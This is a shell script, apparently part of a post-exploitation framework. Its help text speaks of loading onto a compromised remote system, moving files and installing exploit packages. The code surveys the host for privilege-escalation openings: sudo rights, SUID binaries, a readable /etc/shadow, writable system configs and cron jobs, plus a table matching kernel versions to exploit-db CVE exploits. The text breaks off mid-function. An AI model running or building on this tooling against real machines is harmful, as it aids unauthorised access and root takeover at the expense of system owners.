[ "${-##*i*}" ] || stty -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr -icrnl -ixon -ixoff -icanon -opost -isig -iuclc -ixany -imaxbel -xcase -echo min 1 time 0

export LC_ALL=C
IFS='
'

BOLD="\033[01;01m"
RESET="\033[00m"
POINT=".............................."
BLANK="                              " 
EOF="[PEOF]"
ERR="Post: Command failed.\n"
HELP="\
post set  bsd|linux|windows                      set post on remote system memory
     show system|users|process|network|pe|cve    show information
     push FILE FILE                              copy local FILE to remote FILE (windows <= 4MB)
     pull FILE FILE                              copy remote FILE to local FILE
     put  tools DIR                              install static binaries package on DIR
          exploits DIR                           install exploit sources package on DIR
     help                                        show help\n\n"

PORTS="21
22
23
25
53
80
110
143
443
993
995
3306
8080
9050"

READS="/etc/passwd
/etc/shadow
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/auth.log
/var/log/chttp.log
/var/log/cups/error_log
/var/log/dpkg.log
/var/log/faillog
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/messages
/var/log/secure
/var/log/syslog
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/run/utmp
/var/webmin/miniserv.log
/var/www/logs/access_log
/var/www/logs/access.log"

WRITES="/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/crontab
/etc/sysctl.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/resolv.conf
/etc/syslog.conf
/etc/chttp.conf
/etc/apache2/apache2.conf
/etc/lighttpd.conf
/etc/httpd/conf/httpd.conf
/etc/cups/cupsd.confcda
/etc/inetd.conf
/opt/lampp/etc/httpd.conf
/etc/samba/smb.conf
/etc/openldap/ldap.conf
/etc/ldap/ldap.conf
/etc/exports
/etc/auto.master
/etc/auto_master
/etc/fstab
/etc/dhcpcd.conf
/etc/dnsmasq.conf
/etc/fuse.conf
/etc/gai.conf
/etc/healthd.conf
/etc/host.conf
/etc/i3status.conf
/etc/krb5.conf
/etc/ld.so.conf
/etc/libao.conf
/etc/locale.conf
/etc/logrotate.conf
/etc/ltrace.conf
/etc/makepkg.conf
/etc/mdadm.conf
/etc/mke2fs.conf
/etc/mkinitcpio.conf
/etc/modules.conf
/etc/mpd.conf
/etc/netconfig"

LISTS="/root
/var/mail/root
/var/spool/mail/root"

EXPLOITS="2004-1235|2.6.0-2.6.10||||exploit-db.com/exploits/744\nexploit-db.com/exploits/778\nexploit-db.com/exploits/1397||
2004-0077|2.6.0-2.6.2||||exploit-db.com/exploits/160||
2006-2451|2.6.13-2.6.17.4||||exploit-db.com/exploits/2031\nexploit-db.com/exploits/2004\nexploit-db.com/exploits/2005\nexploit-db.com/exploits/2006\nexploit-db.com/exploits/2011||
2006-3626|2.6.16-2.6.17.4||||exploit-db.com/exploits/2013||
2008-0600|2.6.17-2.6.24.1||||exploit-db.com/exploits/5092\nexploit-db.com/exploits/5093||
2008-4210|2.6.19.4-2.6.21.7||||exploit-db.com/exploits/6851\nexploit-db.com/exploits/8369|World-writable sgid directory and shell that does not drop sgid privs upon exec (ash/sash) needed
2009-2692|2.6.11-2.6.30.4||||exploit-db.com/exploits/9479|/proc/sys/vm/mmap_min_addr=0 needed
2009-1895|2.6.31||||exploit-db.com/exploits/9435\nexploit-db.com/exploits/9436\nexploit-db.com/exploits/9641\nexploit-db.com/exploits/9545|/proc/sys/vm/mmap_min_addr=0 or PulseAudio needed
2009-2698|2.6.0-2.6.18.8||||exploit-db.com/exploits/9574\nexploit-db.com/exploits/9575\nexploit-db.com/exploits/9542||
2009-3547|2.6.0-2.6.31.5||||exploit-db.com/exploits/33321\nexploit-db.com/exploits/33322\nexploit-db.com/exploits/10018||
2010-3301|2.6.0-2.6.35.4||||exploit-db.com/exploits/15023||
2010-1146|2.6.0-2.6.33.2||||exploit-db.com/exploits/12130||
2010-2959|2.6.0-2.6.35.3||||exploit-db.com/exploits/14814||
2010-3904|2.6.0-2.6.35.9||||exploit-db.com/exploits/15285||
2010-3848\n2010-3850\n2010-4073|2.6.0-2.6.36.1||||exploit-db.com/exploits/17787||
N/A|2.6.34-2.6.36||||exploit-db.com/exploits/15944||
2010-4347|2.6.0-2.6.36.1||||exploit-db.com/exploits/15774||
2010-3437|2.6.0-2.6.35.7||||exploit-db.com/exploits/15150||
2010-3081|2.6.0-2.6.35.4||||exploit-db.com/exploits/15024||
2012-0056|2.6.39-3.1.10||||exploit-db.com/exploits/18411||
2010-3849\n2010-3850|2.6.0-2.6.36.1||||exploit-db.com/exploits/15704||
2013-1858|3.0.1-3.8.2|CONFIG_USER_NS=y|||exploit-db.com/exploits/38390||
2013-2094|3.8.0-3.8.8|||x86_64|exploit-db.com/exploits/26131\nexploit-db.com/exploits/33589|SMEP/SMAP bypass no included
2013-0268|3.0.1-3.7.5||||exploit-db.com/exploits/27297||
2013-1959|3.0.1-3.8.8||||exploit-db.com/exploits/25450||
2013-2094|3.8.0-3.8.8||||exploit-db.com/exploits/25444||
2014-0038|3.0.1-3.13.1|CONFIG_X86_X32=y|||exploit-db.com/exploits/31346\nexploit-db.com/exploits/31347||
2014-0196|3.0.1-3.14.3||||exploit-db.com/exploits/33516||
2014-2851|3.0.1-3.14.1||||exploit-db.com/exploits/32926||
2014-4014|2.6.0-2.6.19||||exploit-db.com/exploits/33824||
2014-4699|3.0.1-3.15.3||||exploit-db.com/exploits/34134||
2014-4943|3.0.1-3.15.6||||exploit-db.com/exploits/36267||
2014-5207|3.0.1-3.16.1||||exploit-db.com/exploits/34923||
2015-3290|3.13.0-4.1.5|||x86_64|exploit-db.com/exploits/37722||
N/A|2.6.0-2.6.11||||exploit-db.com/exploits/4756||
2015-1328|3.13.0-3.19.0||||exploit-db.com/exploits/37292||
2015-8660|4.3.3||||exploit-db.com/exploits/39230||
2015-8660|3.0.0-4.3.3||||exploit-db.com/exploits/39166||
2016-0728|4.4.1||||exploit-db.com/exploits/40003|Exploit takes about ~30 minutes to run
2016-2384|3.0.0-4.4.8||||exploit-db.com/exploits/41999|Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user
2016-4997|4.6.2||||exploit-db.com/exploits/40049|ip_tables.ko needed
2016-4557|4.4.0-4.5.4|CONFIG_BPF_SYSCALL=y|kernel.unprivileged_bpf_disabled = 0||exploit-db.com/exploits/40759||
2016-5195|2.6.22-3.8.0||||exploit-db.com/exploits/40611\nexploit-db.com/exploits/40839||
2016-8655|4.4.0-4.8.12|CONFIG_USER_NS=y|kernel.unprivileged_userns_clone = 1||exploit-db.com/exploits/40871|CAP_NET_RAW needed
2016-9793|3.11.0-4.8.13|CONFIG_USER_NS=y|kernel.unprivileged_userns_clone = 1||exploit-db.com/exploits/41995|CAP_NET_ADMIN needed. SMEP/SMAP/KASLR bypass no included
2017-6074|4.4.0-4.9.11|CONFIG_IP_DCCP=m|||exploit-db.com/exploits/41458|SMEP/SMAP partial bypass included
2017-7308|3.2.0-4.10.6|CONFIG_USER_NS=y|kernel.unprivileged_userns_clone = 1||exploit-db.com/exploits/41994|CAP_NET_RAW needed
2017-16995|4.4.0-4.14.8|CONFIG_BPF_SYSCALL=y|kernel.unprivileged_bpf_disabled = 0||exploit-db.com/exploits/45010||
2017-1000112|2.6.0-4.13.9||||exploit-db.com/exploits/43418||
2017-1000253|3.2.0-4.12.14|||x86_64|exploit-db.com/exploits/42887||
2018-5333|2.6.0-4.14.13||||github.com/bcoles/kernel-exploits/blob/master/CVE-2018-5333/cve-2018-5333.c|rds.ko needed
2018-18955|4.15.0-4.19.1|CONFIG_USER_NS=y|kernel.unprivileged_userns_clone = 1||exploit-db.com/exploits/45886||
2019-13272|4.0.0-5.1.17||kernel.yama.ptrace_scope = 0|x86_64|exploit-db.com/exploits/47133\nexploit-db.com/exploits/47163|PolKit agent needed"

vle()
{
    [ "$1" = "$2" ] && return 0

    for VERSION in $(printf %b "$1\n$2" | sort -t '.' -k 1,1 -k 2,2 -k 3,3 -k 4,4 -g); do
        if [ "$VERSION" = "$1" ]; then
            return 0
        else
            return 1
        fi
    done
}

vge()
{
    [ "$1" = "$2" ] && return 0
    
    for VERSION in $(printf %b "$1\n$2" | sort -t '.' -k 1,1 -k 2,2 -k 3,3 -k 4,4 -g); do
        if [ "$VERSION" != "$1" ]; then
            return 0
        else
            return 1
        fi
    done
}

append()
{
    if [ -z "$2" ]; then
        BUFFER="$BUFFER\n${BOLD}$1${RESET}\n"
    else
        FIRST=0
        for LINE in $2; do
            if [ "$1" = "NULL" ]; then
                BUFFER=$(printf "%s%.*s%s" "$BUFFER" 4 "$BLANK" "$LINE\n")
            else
                if [ $FIRST -eq 0 ]; then
                    BUFFER=$(printf "%s%.*s%s %.*s %s" "$BUFFER" 4 "$BLANK" "${BOLD}$1${RESET}" $((16 - ${#1})) "$POINT" "$LINE\n")
                else
                    BUFFER=$(printf "%s%.*s%s" "$BUFFER" 22 "$BLANK" "$LINE\n")
                fi
                FIRST=1
            fi
        done
    fi
}

print()
{
    printf %b "$1"
}

success()
{
    [ $? -eq 0 ] && [ -n "$RET" ]
}

show_system()
{
    if [ -z "$CACHE_SYSTEM" ]; then
        append "HOST"

        RET=$(hostname 2>/dev/null)
        if success; then
            append "NAME" "$RET"
        else
            append "NAME" "N/A"
        fi
        RET=$(uname -o 2>/dev/null)
        if success; then
            append "OS" "$RET"
        else
            append "OS" "N/A"
        fi
        RET=$(uname -sr 2>/dev/null)
        if success; then
            append "KERNEL" "$RET"
        else 
            append "KERNEL" "N/A"
        fi
        RET=$(uname -m 2>/dev/null)
        if success; then
            append "ARCH" "$RET"
        else
            append "ARCH" "N/A"
        fi
        RET=$(awk '/^NAME=/' /etc/*-release 2>/dev/null | awk -F '=' '{gsub(/"/, "", $2); print $2}' | tr -d "\n")
        if success; then
            VERSION=$(awk '/^VERSION=/' /etc/*-release 2>/dev/null | awk -F '=' '{gsub(/"/, "", $2); print $2}')
            if success; then
                append "DISTRO" "$RET $VERSION"
            else
                append "DISTRO" "$RET"
            fi
        else
            append "DISTRO" "N/A"
        fi
        RET=$(ls -l /sbin/init 2>/dev/null)
        if success; then
            if echo "$RET" | grep -qi "systemd"; then
                INIT="Systemd"
            elif echo "$RET" | grep -qi "upstart"; then
                INIT="Upstart"
            elif echo "$RET" | grep -qi "runit"; then
                INIT="Runit"
            elif echo "$RET" | grep -qi "sysv"; then
                INIT="System V"
            elif echo "$RET" | grep -qi "init"; then
                INIT="Init"
            fi
            if [ -n "$INIT" ]; then
                append "INIT" "$INIT"
            else
                append "INIT" "N/A"
            fi
        else
            append "INIT" "N/A"
        fi
        if [ "$INIT" = "Systemd" ]; then
            RET=$(systemctl get-default 2>/dev/null)
        else
            RET=$(runlevel 2>/dev/null)
        fi
        if success; then
            append "RUNLEVEL" "$RET"
        else
            append "RUNLEVEL" "N/A"
        fi
        RET=$(grep -qi "^flags.*hypervisor" /proc/cpuinfo 2>/dev/null)
        if [ $? -eq 0 ]; then
            append "VBOX" "Yes"
        else 
            append "VBOX" "No"
        fi
        RET=$(grep -i docker /proc/self/cgroup 2>/dev/null)
        if [ $? -eq 0 ]; then
            append "DOCKER" "Yes"
        else 
            append "DOCKER" "No"
        fi
        RET=$(grep -qia container=lxc /proc/1/environ 2>/dev/null)
        if [ $? -eq 0 ]; then
            append "LXC" "yes"
        else 
            append "LXC" "No"
        fi
        RET=$(uptime -p 2>/dev/null)
        if success; then
            append "UPTIME" "$RET"
        else
            append "UPTIME" "N/A"
        fi
        
        append "STORAGE"

        LC_ALL=
        RET=$(lsblk -fm 2>/dev/null)
        LC_ALL=C
        if [ $? -ne 0 ] || [ -z "$RET" ]; then
            RET=$(df -hx tmpfs 2>/dev/null)
        fi
        if success; then
            append "NULL" "$RET"
        else
            append "NULL" "N/A"
        fi

        append "DEV"

        RET=$(which gcc 2>/dev/null)
        if success; then
            append "GCC" "$RET"
        else
            append "GCC" "No"
        fi
        RET=$(which python 2>/dev/null)
        if success; then
            PYTHON="$RET\n"
        fi
        RET=$(which python2 2>/dev/null)
        if success; then
            PYTHON="$PYTHON$RET\n"
        fi
        RET=$(which python2.7 2>/dev/null)
        if success; then
            PYTHON="$PYTHON$RET\n"
        fi
        RET=$(which python3 2>/dev/null)
        if success; then
            PYTHON="$PYTHON$RET\n"
        fi
        RET=$(which python3.6 2>/dev/null)
        if success; then
            PYTHON="$PYTHON$RET\n"
        fi
        RET=$(which python3.7 2>/dev/null)
        if success; then
            PYTHON="$PYTHON$RET\n"
        fi
        if [ -n "$PYTHON" ]; then
            append "PYTHON" "$(printf %b "$PYTHON")"
        else
            append "PYTHON" "No"
        fi
        RET=$(which perl 2>/dev/null)
        if success; then
            append "PERL" "$RET"
        else
            append "PERL" "No"
        fi
        RET=$(which ruby 2>/dev/null)
        if success; then
            append "RUBY" "$RET"
        else
            append "RUBY" "No"
        fi

        append "TOOLS"

        RET=$(which wget 2>/dev/null)
        if success; then
            append "WGET" "$RET"
        else
            append "WGET" "No"
        fi
        RET=$(which curl 2>/dev/null)
        if success; then
            append "CURL" "$RET"
        else
            append "CURL" "No"
        fi
        RET=$(which git 2>/dev/null)
        if success; then
            append "GIT" "$RET"
        else
            append "GIT" "No"
        fi
        RET=$(which ftp 2>/dev/null)
        if success; then
            append "FTP" "$RET"
        else
            append "FTP" "No"
        fi
        RET=$(which telnet 2>/dev/null)
        if success; then
            append "TELNET" "$RET"
        else
            append "TELNET" "No"
        fi
        RET=$(which ssh 2>/dev/null)
        if success; then
            SSH="$RET\n"
        fi
        RET=$(which sshd 2>/dev/null)
        if success; then
            SSH="$SSH$RET\n"
        fi
        if [ -n "$SSH" ]; then
            append "SSH" "$(printf %b "$SSH")"
        else
            append "SSH" "No"
        fi
        RET=$(which nc 2>/dev/null)
        if success; then
            NETCAT="$RET\n"
        fi
        RET=$(which nc.traditional 2>/dev/null)
        if success; then
            NETCAT="$NETCAT$RET\n"
        fi
        RET=$(which nc.openbsd 2>/dev/null)
        if success; then
            NETCAT="$NETCAT$RET\n"
        fi
        RET=$(which ncat 2>/dev/null)
        if success; then
            NETCAT="$NETCAT$RET\n"
        fi
        RET=$(which netcat 2>/dev/null)
        if success; then
            NETCAT="$NETCAT$RET\n"
        fi
        if [ -n "$NETCAT" ]; then
            append "NETCAT" "$(printf %b "$NETCAT")"
        else
            append "NETCAT" "No"
        fi
        RET=$(which socat 2>/dev/null)
        if success; then
            append "SOCAT" "$RET"
        else
            append "SOCAT" "No"
        fi
        RET=$(which tcpdump 2>/dev/null)
        if success; then
            append "TCPDUMP" "$RET"
        else
            append "TCPDUMP" "No"
        fi
        RET=$(which nmap 2>/dev/null)
        if success; then
            append "NMAP" "$RET"
        else
            append "NMAP" "No"
        fi
        RET=$(which tar 2>/dev/null)
        if success; then
            append "TAR" "$RET"
        else
            append "TAR" "No"
        fi
        RET=$(which vim 2>/dev/null)
        if success; then
            append "VIM" "$RET"
        else
            append "VIM" "No"
        fi
        RET=$(which vi 2>/dev/null)
        if success; then
            append "VI" "$RET"
        else
            append "VI" "No"
        fi

        CACHE_SYSTEM="$BUFFER\n"

        print "$BUFFER\n"
    else
        print "$CACHE_SYSTEM"
    fi  
}

show_users()
{
    if [ -z "$CACHE_USERS" ]; then
        append "EFFECTIVE"

        RET=$(id -un 2>/dev/null)
        if success; then
            USERNAME=$RET
        else
            RET=$(who 2>/dev/null | awk '{print $1}')
            if success; then
                USERNAME=$RET
            fi
        fi
        if [ -n "$USERNAME" ]; then
            append "NAME" "$USERNAME"
        else
            append "NAME" "N/A"
        fi
        RET=$(id -ur 2>/dev/null)
        if success; then
            append "UID" "$RET"
        else
            append "UID" "N/A"
        fi
        RET=$(id -gn 2>/dev/null)
        if success; then
            GROUP=$RET
            append "GROUP" "$RET"
        else
            append "GROUP" "N/A"
        fi
        if [ -n "$GROUP" ]; then
            RET=$(id -Gn 2>/dev/null | sed "s/$GROUP //g")
        else
            RET=$(id -Gn 2>/dev/null)
        fi
        if success; then
            append "SGROUP" "$RET"
        else
            append "SGROUP" "N/A"
        fi
        if [ -n "$USERNAME" ]; then
            RET=$(awk -F: '($1 == "'"$USERNAME"'") {print $7}' /etc/passwd 2>/dev/null)
            if success; then
                append "SHELL" "$RET"
            else
                append "SHELL" "N/A"
            fi
        else
            append "SHELL" "N/A"
        fi
        if [ -n "$USERNAME" ]; then
            RET=$(grep -Ev "^#" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 {print $1}')
            if success; then
                if echo "$RET" | grep -q "$USERNAME"; then
                    append "ROOT" "Yes"
                    ROOT=0
                else
                    RET=$(id -u 2>/dev/null)
                    if [ $? -eq 0 ] && [ "$RET" = "0" ]; then
                        append "ROOT" "Yes (su/sudo)"
                        ROOT=0
                    else
                        append "ROOT" "No"
                    fi
                fi
            else
                append "ROOT" "N/A"
            fi
        else
            append "ROOT" "N/A"
        fi
        if [ $ROOT -eq 0 ]; then
            append "SUDO" " "
        else
            if [ -n "$USERNAME" ]; then
                sudo -K >/dev/null 2>&1
                RET=$(sudo -nu "$USERNAME" sudo -nv 2>&1)
                if echo "$RET" | grep -q "sudo:"; then
                    RET=$(sudo -n ls >/dev/null 2>&1)
                    if [ $? -eq 0 ]; then
                        append "SUDO" "Yes (no password)"
                    else
                        append "SUDO" "Yes (password)"
                    fi
                elif echo "$RET" | grep -qi "Sorry"; then
                    append "SUDO" "Yes (limited)"
                else
                    append "SUDO" "No"
                fi
            else
                append "SUDO" "N/A"
            fi
        fi
        if [ -n "$USERNAME" ]; then
            RET=$(awk -v FS=':' -v username="$USERNAME" '($1 == username) {print $6}' "/etc/passwd" 2>/dev/null)
        if success; then
                append "HOME" "$RET"
            else
                append "HOME" "N/A"
            fi
        else
            append "HOME" "N/A"
        fi
        RET=$(echo "$PATH" 2>/dev/null)
        if success; then
            append "PATH" "$RET"
        else
            append "PATH" "N/A"
        fi
        RET=$(env 2>/dev/null | grep -v 'LESSOPEN\|LESSCLOSE\|LS_COLORS\|OLDPWD\|USER\|PWD\|HOME\|SHELL\|LOGNAME\|PATH\|COLORTERM\|/usr/bin/env' | sed -r 's/=/: /')
        if success; then
            append "ENV" "$RET"
        else
            append "ENV" "N/A"
        fi
        
        append "NORMAL"

        UID_MIN=$(cat /etc/login.defs 2>/dev/null | grep "^UID_MIN" | sed 's/\s\+/,/g' | cut -d "," -f2)
        if [ $? -ne 0 ] || [ -z "$UID_MIN" ]; then
            UID_MIN=1000
        fi
        RET=$(awk -v uid_min="$UID_MIN" -F: '($3 >= uid_min) && ($1 != "nobody") {print $1":"$7"\n"}' /etc/passwd 2>/dev/null)
        if success; then
            append "NULL" "$RET"
        else
            append "NULL" "N/A"
        fi

        append "ROOT"

        RET=$(grep -Ev "^#" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 {print $1":"$7"\n"}')
        if success; then
            append "NULL" "$RET"
        else
            append "NULL" "N/A"
        fi
        
        append "SYSTEM"

        RET=$(awk -v uid_min="$UID_MIN" -F: '($3 < uid_min) {print $1":"$7"\n"}' /etc/passwd 2>/dev/null)
        if success; then
            append "NULL" "$RET"
        else
            append "NULL" "N/A"
        fi

        append "LOGGED-ON"

        RET=$(who -H 2>/dev/null)
        if success; then
            append "NULL" "$RET"
        else
            append "NULL" "N/A"
        fi
        
        CACHE_USERS="$BUFFER\n"

        print "$BUFFER\n"
    else
        print "$CACHE_USERS"
    fi
}

show_process()
{
    if [ -z "$CACHE_PROCESS" ]; then
        append "TTY"
    
        RET=$(ps aco user,tty,pid,command 2>/dev/null)
        if success; then
            append "NULL" "$RET"
        else
            append "NULL" "N/A"
        fi
        
        append "SERVICES"
    
        RET=$(ls -l /sbin/init 2>/dev/null)
        if success; then
            if echo "$RET" | grep -qi "systemd"; then
                RET=$(systemctl list-units --type service --state running 2>/dev/null | sed -n '/UNIT/,/^$/p')
            elif echo "$RET" | grep -qi "upstart"; then
                RET=$(initctl list 2>/dev/null)
            elif echo "$RET" | grep -qi "runit"; then
                RET=$(sv service list 2>/dev/null)
            elif echo "$RET" | grep -qi "sysv"; then
                RET=$(service --status-all 2>/dev/null | grep + | cut " " -f6)
            elif echo "$RET" | grep -qi "init"; then
                RET=$(initctl list 2>/dev/null)
            else
                RET=""
            fi
        fi
        if success; then
            append "NULL" "$RET"
        else
            append "NULL" "N/A"
        fi

        CACHE_PROCESS="$BUFFER\n"

        print "$BUFFER\n"
    else
        print "$CACHE_PROCESS"
    fi
}

show_network()
{
    if [ -z "$CACHE_NETWORK" ]; then
        append "PUBLIC"

        RET=$(wget -T 25 -q -O - ipinfo.io/json 2>/dev/null | tr "," "\n" | tr -d '{"}')
        if [ $? -ne 0 ] || [ -z "$RET" ]; then
            RET=$(curl --connect-timeout 25 -s ipinfo.io/json 2>/dev/null | tr "," "\n" | tr -d '{"}')
        fi
        if success; then
            IP=$(echo "$RET" | grep -m 1 -E "ip" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//')
            if [ $? -eq 0 ] && [ -n "$IP" ]; then
                append "IP" "$IP"
            else
                append "IP" "N/A"
            fi
            CITY=$(echo "$RET" | grep -E "city" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//')
            if [ $? -eq 0 ] && [ -n "$CITY" ]; then
                append "CITY" "$CITY"
            else
                append "CITY" "N/A"
            fi
            REGION=$(echo "$RET" | grep -E "region" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//')
            if [ $? -eq 0 ] && [ -n "$REGION" ]; then
                append "REGION" "$REGION"
            else
                append "REGION" "N/A"
            fi
            COUNTRY=$(echo "$RET" | grep -E "country" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//')
            if [ $? -eq 0 ] && [ -n "$COUNTRY" ]; then
                append "COUNTRY" "$COUNTRY"
            else
                append "COUNTRY" "N/A"
            fi
        else
            append "IP" "N/A"
            append "CITY" "N/A"
            append "REGION" "N/A"
            append "COUNTRY" "N/A"
        fi

        append "LOCAL"

        RET=$(ip a s 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
        if [ $? -ne 0 ] || [ -z "$RET" ]; then
            RET=$(ifconfig 2>/dev/null | grep -Eo "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sed -n 1p)
        fi
        if success; then
            append "IP" "$RET"
        else
            append "IP" "N/A"
        fi
        RET=$(ss -4Hnl 2>/dev/null | grep LISTEN | sed 's/\s\s*/ /g' | cut -d " " -f5)
        if [ $? -ne 0 ] || [ -z "$RET" ]; then
            RET=$(netstat -4tuln 2>/dev/null | grep LISTEN | sed 's/\s\s*/ /g' | cut -d " " -f4)
        fi
        if success; then
            for PORT in $PORTS; do
                OUT=$(echo "$RET" | grep -w "$PORT")
                if [ -n "$OUT" ]; then
                    OPEN="$OPEN$OUT (open)\n"
                fi
            done
            if [ -n "$OPEN" ]; then
                append "PORTS" "$(printf %b "$OPEN")"
            else
                append "PORTS" "*:* (closed)"
            fi
        else
            append "PORTS" "N/A"
        fi
        RET=$(ip r s 2>/dev/null | grep -Eo 'default via ([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
        if [ $? -ne 0 ] || [ -z "$RET" ]; then
            RET=$(route -n 2>/dev/null | grep 'UG[ \t]' | awk '{print $2}')
        fi
        if success; then
            append "GATEWAY" "$RET"
        else
            append "GATEWAY" "N/A"
        fi
        RET=$(grep -Ev "(^#.*|^$)" /etc/resolv.conf 2>/dev/null | grep "nameserver" | grep -Eo "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b")
        if success; then
            append "DNS" "$RET"
        else
            append "DNS" "N/A"
        fi

        append "SOCKETS"

        RET=$(ss -tan 2>/dev/null)
        if [ $? -ne 0 ] || [ -z "$RET" ]; then
            RET=$(netstat -tan 2>/dev/null)
        fi
        if success; then
            append "TCP" "$RET"
        else
            append "TCP" "N/A"
        fi
        RET=$(ss -uan 2>/dev/null)
        if [ $? -ne 0 ] || [ -z "$RET" ]; then
            RET=$(netstat -uan 2>/dev/null)
        fi
        if success; then
            append "UDP" "$RET"
        else
            append "UDP" "N/A"
        fi

        CACHE_NETWORK="$BUFFER\n"

        print "$BUFFER\n"
    else
        print "$CACHE_NETWORK"
    fi
}

show_pe()
{
    if [ -z "$CACHE_PE" ]; then
        append "FILES"

        RET=$(find / -perm -4000 -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if [ -n "$RET" ]; then
            append "SUID" "$RET"
        else
            append "SUID" "N/A"
        fi
        RET=$(find / -perm -2000 -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if [ -n "$RET" ]; then
            append "SGID" "$RET"
        else
            append "SGID" "N/A"
        fi
        RET=$(find / -perm -1000 -printf '%M %u %g %p\n' 2>/dev/null)
        if [ -n "$RET" ]; then
            append "SBIT" "$RET"
        else
            append "SBIT" "N/A"
        fi
        for FILE in $READS; do
            RET=$(test -e "$FILE" 2>/dev/null)
            if [ $? -eq 0 ]; then
                RET=$(test -r "$FILE" 2>/dev/null)
                if [ $? -eq 0 ]; then
                    RET=$(find "$FILE" -type f -printf '%M %u %g %p\n' 2>/dev/null)
                    if [ -n "$RET" ]; then
                        FILES="$FILES$RET: Yes\n"
                    fi
                else
                    RET=$(find "$FILE" -type f -printf '%M %u %g %p\n' 2>/dev/null)
                    if [ -n "$RET" ]; then
                        FILES="$FILES$RET: No\n"
                    fi
                fi
            fi
        done
        if [ -n "$FILES" ]; then
            append "READ" "$(printf %b "$FILES")"
        else
            append "READ" "N/A"
        fi
        FILES=""
        for FILE in $WRITES; do
            RET=$(test -e "$FILE" 2>/dev/null)
            if [ $? -eq 0 ]; then
                RET=$(test -w "$FILE" 2>/dev/null)
                if [ $? -eq 0 ]; then
                    RET=$(find "$FILE" -type f -printf '%M %u %g %p\n' 2>/dev/null)
                    if [ -n "$RET" ]; then
                        FILES="$FILES$RET: Yes\n"
                    fi
                else
                    RET=$(find "$FILE" -type f -printf '%M %u %g %p\n' 2>/dev/null)
                    if [ -n "$RET" ]; then
                        FILES="$FILES$RET: No\n"
                    fi
                fi
            fi
        done
        if [ -n "$FILES" ]; then
            append "WRITE" "$(printf %b "$FILES")"
        else
            append "WRITE" "N/A"
        fi
        RET=$(test -x /tmp 2>/dev/null)
        if [ $? -eq 0 ]; then
            RET=$(find /tmp -maxdepth 0 -type d -printf '%M %u %g %p\n' 2>/dev/null)
            if [ -n "$RET" ]; then
                EXEC="$RET: Yes\n"
            fi
        else
            EXEC="/tmp: No\n"
        fi
        if [ -n "$EXEC" ]; then
            append "EXEC" "$(printf %b "$EXEC")"
        else
            append "EXEC" "N/A"
        fi
        for DIR in $LISTS; do
            RET=$(ls "$DIR" 2>/dev/null)
            if [ $? -eq 0 ]; then
                RET=$(find "$DIR" -maxdepth 0 -type d -printf '%M %u %g %p\n' 2>/dev/null)
                if [ -n "$RET" ]; then
                    DIRS="$DIRS$RET: Yes\n"
                fi
            else
                RET=$(find "$DIR" -maxdepth 0 -type d -printf '%M %u %g %p\n' 2>/dev/null)
                if [ -n "$RET" ]; then
                    DIRS="$DIRS$RET: No\n"
                fi
            fi
        done
        if [ -n "$DIRS" ]; then
            append "LIST" "$(printf %b "$DIRS")"
        else
            append "LIST" "N/A"
        fi
        RET=$(find / ! -path "*/proc/*" ! -path "*/sys/*" ! -path "*/dev/*" -perm -2 ! -type l -printf '%M %u %g %p\n' 2>/dev/null)
        if [ -n "$RET" ]; then
            append "WORLD-WRITE" "$RET"
        else
            append "WORLD-WRITE" "No"
        fi
        RET=$(find / ! -path "*/proc/*" ! -path "/sys/*" \( -perm -0002 -a ! -perm -1000 \) -type d -printf '%M %u %g %p\n' 2>/dev/null)
        if [ -n "$RET" ]; then
            append "WORLD-EXEC" "$RET"
        else
            append "WORLD-EXEC" "No"
        fi
        RET=$(find / ! -path "*/proc/*" ! -path "/sys/*" -nouser -nogroup -type l -printf '%M %u %g %p\n' 2>/dev/null)
        if [ -n "$RET" ]; then
            append "UNOWNED" "$RET"
        else
            append "UNOWNED" "No"
        fi

        append "CRON"

        RET=$(find /etc/anacrontab -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            ANACRONTAB=$(cat /etc/anacrontab 2>/dev/null | grep -Ev "#|^$")
            if [ $? -eq 0 ] && [ -n "$ANACRONTAB" ]; then
                append "ANACRONTAB" "$(printf %b "$RET\n \n$ANACRONTAB\n \n")"
            else
                append "ANACRONTAB" "$RET"
            fi
        else
            append "ANACRONTAB" "No"
        fi
        RET=$(find /etc/crontab -type f -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            CRONTAB=$(cat /etc/crontab 2>/dev/null | grep -Ev "#|^$")
            if [ $? -eq 0 ] && [ -n "$CRONTAB" ]; then
                append "CRONTAB" "$(printf %b "$RET\n \n$CRONTAB\n \n")"
            else
                append "CRONTAB" "$RET"
            fi
        else
            append "CRONTAB" "No"
        fi
        RET=$(find /etc/cron.d -type d -printf '%M %u %g %p\n' 2>/dev/null)
        if success; then
            for FILE in /etc/cron.d/*; do
                RET=$(find "$FILE" -type f -printf '%M %u %g %p\n' 2>/dev/null)
                if [ $? -eq 0 ]; then
                    CROND="$CROND$RET\n"
                    RET=$(cat "$FILE" 2>/dev/null | grep -Ev "#|^$")
                    if success; then
                        CROND="$CROND\n \n$RET\n \n"
                    fi
                fi
            done
